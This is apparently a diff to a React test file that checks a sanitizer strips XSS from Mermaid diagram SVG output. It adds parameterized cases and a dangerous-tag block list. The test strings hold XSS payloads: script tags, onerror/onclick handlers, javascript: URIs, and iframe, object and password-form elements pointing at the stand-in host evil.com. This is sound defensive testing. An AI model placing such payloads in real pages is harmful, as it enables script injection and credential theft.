@@ -112,107 +112,129 @@ describe('RenderedMarkdown', () => {
   describe('Mermaid XSS sanitization', () => {
     const MERMAID_BLOCK = '```mermaid\ngraph TD\n  A-->B\n```';
 
-    it('strips <script> tags from SVG output', async () => {
-      const maliciousSvg = '<svg><text>Diagram</text><script>alert("xss")</script></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
+    /** Render a mermaid block with the given SVG and return the diagram's innerHTML. */
+    async function renderMermaidSvg(svg: string): Promise<string> {
+      mocks.mermaidRender.mockResolvedValue({ svg });
       render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
+      let html = '';
       await waitFor(() => {
         const diagram = screen.getByTestId('mermaid-diagram');
         expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Diagram');
-        expect(diagram.innerHTML).not.toContain('<script>');
-        expect(diagram.innerHTML).not.toContain('alert');
+        html = diagram.innerHTML;
       });
+      return html;
+    }
+
+    // Parameterized XSS vector tests — each case specifies malicious SVG,
+    // strings that must survive sanitization, and strings that must be stripped.
+    const xssVectors: Array<{ name: string; svg: string; mustContain: string[]; mustNotContain: string[] }> = [
+      {
+        name: 'script tags in SVG',
+        svg: '<svg><text>Diagram</text><script>alert("xss")</script></svg>',
+        mustContain: ['Diagram'],
+        mustNotContain: ['<script>', 'alert'],
+      },
+      {
+        name: 'event handler attributes',
+        svg: '<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>',
+        mustContain: ['Safe'],
+        mustNotContain: ['onclick', 'onerror', 'alert'],
+      },
+      {
+        name: 'javascript: URIs',
+        svg: '<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>',
+        mustContain: ['Click me'],
+        mustNotContain: ['javascript:'],
+      },
+      {
+        name: 'external references in <use>',
+        svg: '<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>',
+        mustContain: ['Safe'],
+        mustNotContain: ['evil.com'],
+      },
+      {
+        name: 'img+onerror and script inside foreignObject',
+        svg: '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>',
+        mustContain: ['Safe Label', 'foreignObject'],
+        mustNotContain: ['<img', 'onerror', '<script', 'alert'],
+      },
+      {
+        name: 'iframe and object inside foreignObject',
+        svg: '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object><span>Safe content</span></div></foreignObject></svg>',
+        mustContain: ['Safe content', 'foreignObject'],
+        mustNotContain: ['<iframe', '<object', 'evil.com'],
+      },
+      {
+        name: 'form and input inside foreignObject',
+        svg: '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form><span>Node Label</span></div></foreignObject></svg>',
+        mustContain: ['Node Label'],
+        mustNotContain: ['<form', '<input', 'evil.com'],
+      },
+    ];
+
+    it.each(xssVectors)('strips $name', async ({ svg, mustContain, mustNotContain }) => {
+      const html = await renderMermaidSvg(svg);
+      for (const s of mustContain) expect(html).toContain(s);
+      for (const s of mustNotContain) expect(html).not.toContain(s);
     });
 
-    it('strips event handler attributes from SVG output', async () => {
-      const maliciousSvg = '<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
+    // Parameterized preservation tests — verify safe SVG structures survive sanitization.
+    const preservationCases: Array<{ name: string; svg: string; mustContain: string[]; mustNotContain?: string[] }> = [
+      {
+        name: 'foreignObject with safe Mermaid label content',
+        svg: '<svg><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject></svg>',
+        mustContain: ['Node A', 'foreignObject', 'nodeLabel'],
+      },
+      {
+        name: 'valid SVG content (rect, text, fill)',
+        svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>',
+        mustContain: ['Node A', '<rect', '<text', 'fill="#1a3a32"'],
+      },
+      {
+        name: 'sequence diagram SVG using text elements (no foreignObject)',
+        svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300"><rect x="50" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/><text x="110" y="35" text-anchor="middle" fill="#e6f2ee">Alice</text><rect x="250" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/><text x="310" y="35" text-anchor="middle" fill="#e6f2ee">Bob</text><line x1="110" y1="50" x2="310" y2="80" stroke="#9fb7ae"/><text x="210" y="70" text-anchor="middle" fill="#e6f2ee">Hello</text></svg>',
+        mustContain: ['Alice', 'Bob', 'Hello', '<text', '<line'],
+      },
+      {
+        name: 'nested foreignObject strips inner (attacker-crafted)',
+        svg: '<svg><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span>Outer label</span><foreignObject width="50" height="20"><div><script>alert(1)</script></div></foreignObject></div></foreignObject></svg>',
+        mustContain: ['Outer label'],
+        mustNotContain: ['<script', 'alert'],
+      },
+    ];
 
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe');
-        expect(diagram.innerHTML).not.toContain('onclick');
-        expect(diagram.innerHTML).not.toContain('onerror');
-        expect(diagram.innerHTML).not.toContain('alert');
-      });
+    it.each(preservationCases)('preserves $name', async ({ svg, mustContain, mustNotContain }) => {
+      const html = await renderMermaidSvg(svg);
+      for (const s of mustContain) expect(html).toContain(s);
+      for (const s of mustNotContain ?? []) expect(html).not.toContain(s);
     });
 
-    it('strips javascript: URIs from SVG output', async () => {
-      const maliciousSvg = '<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Click me');
-        expect(diagram.innerHTML).not.toContain('javascript:');
-      });
+    it('preserves multiple foreignObject elements in one SVG (multi-node flowchart)', async () => {
+      const html = await renderMermaidSvg([
+        '<svg>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node B</span></div></foreignObject>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node C</span></div></foreignObject>',
+        '</svg>',
+      ].join(''));
+      expect(html).toContain('Node A');
+      expect(html).toContain('Node B');
+      expect(html).toContain('Node C');
+      expect((html.match(/foreignObject/gi) ?? []).length).toBeGreaterThanOrEqual(3);
     });
 
-    it('strips <use> elements with external references', async () => {
-      const maliciousSvg = '<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe');
-        expect(diagram.innerHTML).not.toContain('evil.com');
-      });
-    });
-
-    it('strips foreignObject elements (DOMPurify blocks by default)', async () => {
-      const maliciousSvg = '<svg><foreignObject><div><img src="x" onerror="alert(1)"/></div></foreignObject><text>Safe</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe');
-        expect(diagram.innerHTML).not.toContain('foreignObject');
-        expect(diagram.innerHTML).not.toContain('onerror');
-      });
-    });
-
-    it('preserves valid SVG content through sanitization', async () => {
-      const validSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: validSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Node A');
-        expect(diagram.innerHTML).toContain('<rect');
-        expect(diagram.innerHTML).toContain('<text');
-        expect(diagram.innerHTML).toContain('fill="#1a3a32"');
-      });
-    });
-
-    it('uses explicit ALLOWED_TAGS and ALLOWED_ATTR in SVG sanitize config', () => {
+    it('uses explicit ALLOWED_TAGS, ADD_TAGS, and ALLOWED_ATTR in SVG sanitize config', () => {
       // Verify the config has explicit allowlists (defense-in-depth)
       expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).toBeDefined();
       expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS!.length).toBeGreaterThan(10);
       expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR).toBeDefined();
       expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR!.length).toBeGreaterThan(10);
 
-      // script, iframe, object, embed, foreignObject must NOT be in the allowlist
-      const blockedTags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea', 'foreignObject'];
+      // Dangerous tags must NOT be in any allowlist
+      const allAllowedTags = [...SVG_SANITIZE_CONFIG.ALLOWED_TAGS!, ...SVG_SANITIZE_CONFIG.ADD_TAGS!];
+      const blockedTags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea', 'img'];
       for (const tag of blockedTags) {
-        expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).not.toContain(tag);
+        expect(allAllowedTags).not.toContain(tag);
       }
 
       // Event handler attributes must NOT be in the allowlist
@@ -221,11 +243,27 @@ describe('RenderedMarkdown', () => {
         expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR).not.toContain(attr);
       }
 
-      // Core Mermaid-required tags must be present
-      const requiredTags = ['svg', 'g', 'path', 'rect', 'text', 'tspan', 'defs', 'style', 'marker'];
-      for (const tag of requiredTags) {
+      // Core SVG tags must be in ALLOWED_TAGS
+      const requiredSvgTags = ['svg', 'g', 'path', 'rect', 'text', 'tspan', 'defs', 'style', 'marker'];
+      for (const tag of requiredSvgTags) {
         expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).toContain(tag);
       }
+
+      // foreignObject and HTML elements must be in ADD_TAGS (extends SVG profile)
+      // Note: jsdom normalizes SVG tag names to lowercase at runtime
+      const addTagsLower = SVG_SANITIZE_CONFIG.ADD_TAGS!.map((t: string) => t.toLowerCase());
+      // All five tags that Mermaid v11 generates inside foreignObject must be present
+      const requiredAddTags = ['foreignobject', 'div', 'span', 'p', 'br'];
+      for (const tag of requiredAddTags) {
+        expect(addTagsLower).toContain(tag);
+      }
+
+      // HTML_INTEGRATION_POINTS must include both foreignobject (SVG→HTML bridge)
+      // and annotation-xml (MathML→HTML bridge) for namespace bridging
+      expect(SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS).toBeDefined();
+      const integrationPoints = SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS as Record<string, unknown>;
+      expect(integrationPoints).toHaveProperty('foreignobject', true);
+      expect(integrationPoints).toHaveProperty('annotation-xml', true);
     });
 
     it('preserves complex Mermaid SVG with gradients, markers, and filters', async () => {
